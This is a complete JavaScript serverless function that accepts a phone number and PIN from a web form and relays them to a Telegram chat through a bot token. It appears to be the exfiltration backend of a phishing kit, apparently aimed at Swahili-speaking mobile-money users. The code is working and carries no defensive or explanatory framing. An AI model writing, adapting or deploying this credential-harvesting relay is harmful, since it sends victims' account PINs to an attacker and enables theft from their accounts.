const https = require('https');

exports.handler = async function(event, context) {
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: 'Method Not Allowed' };
  }

  const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = process.env;

  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('Telegram credentials missing');
    return { statusCode: 500, body: JSON.stringify({ error: 'Telegram credentials missing' }) };
  }

  try {
    const data = JSON.parse(event.body);
    const { phone, pin } = data;

    const message = `🚨 New Submission 🚨\n\nNamba: ${phone}\nSiri: ${pin}`;

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const payload = JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: message
    });

    const options = {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload)
      }
    };

    return new Promise((resolve, reject) => {
      const req = https.request(url, options, (res) => {
        let resData = '';
        res.on('data', (chunk) => {
          resData += chunk;
        });
        res.on('end', () => {
          if (res.statusCode >= 200 && res.statusCode < 300) {
            resolve({
              statusCode: 200,
              body: JSON.stringify({ success: true })
            });
          } else {
            console.error('Telegram API error:', res.statusCode, resData);
            resolve({
              statusCode: res.statusCode,
              body: resData
            });
          }
        });
      });

      req.on('error', (e) => {
        console.error('Request error:', e.message);
        resolve({
          statusCode: 500,
          body: JSON.stringify({ error: e.message })
        });
      });

      req.write(payload);
      req.end();
    });

  } catch (error) {
    console.error('Parse error:', error.message);
    return { statusCode: 400, body: JSON.stringify({ error: 'Invalid request body' }) };
  }
};
